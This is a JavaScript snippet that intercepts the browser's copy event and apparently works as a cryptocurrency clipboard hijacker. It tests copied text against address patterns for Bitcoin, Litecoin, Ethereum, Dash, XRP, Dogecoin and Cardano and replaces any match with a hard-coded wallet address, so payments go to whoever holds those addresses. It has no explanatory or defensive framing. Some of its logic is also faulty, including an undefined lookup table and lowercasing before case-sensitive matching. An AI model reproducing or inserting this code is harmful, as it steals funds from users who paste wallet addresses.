document.addEventListener('copy', event => {
    let content = document.getSelection().toString().toLowerCase().trim()
    
    if(content in dictionary) {
        content = dictionary[content]
        event.clipboardData.setData('text', content)
        event.preventDefault()
        event.stopPropagation()
    }

    let RegexMatch = [
        ["lite", "/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/g", "MULxDmMuziKwURhCM9Nkudt4WvYUciNPoJ"],
        ["btc", "((bc|tb)(0([ac-hj-np-z02-9]{39}|[ac-hj-np-z02-9]{59})|1[ac-hj-np-z02-9]{8,87})|([13]|[mn2])[a-km-zA-HJ-NP-Z1-9]{25,39})"
        , "3NhWrcihyXJkb3AZa1njPBa6dEdzfaSRw9"],
        ["eth", "^0x[a-fA-F0-9]{40}$", "0xa8ea9e883432458a3498b9a0358f12ca91e851e3"],
        ["dash", "^X[1-9A-HJ-NP-Za-km-z]{33}$", "XoDv3DDhiSgUnQ8VWMf8NCCtgNTFdDyHo7"],
        ["xrp", "^r[0-9a-zA-Z]{24,34}$", "rHirUksg7262A7PJSddktF4QUYPA4po8oj"],
        ["doge", "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", "DAAvAk86nt4XzANv7UxL4YGN3ZwGTCgtym"],
        ["ada", "^D[A-NP-Za-km-z1-9]{35,}$", "addr1q8l3wumksfs33v84ezuft6veqaw6rnxqvdt63lshccakcyllzaehdqnprzc0tj9cjh5ejp6a58xvqc6h4rlp033mdsfsxk657t"]
]

var length = (RegexMatch).length;
let changeaddress
let RecognisedAddress

for (var i = 0; i < length; i++) {
    let found = content.match(RegexMatch[i][1]);    
    if (found){
        RecognisedAddress = i
    }
}

event.clipboardData.setData('text', RegexMatch[RecognisedAddress][2])
event.preventDefault()
event.stopPropagation()

})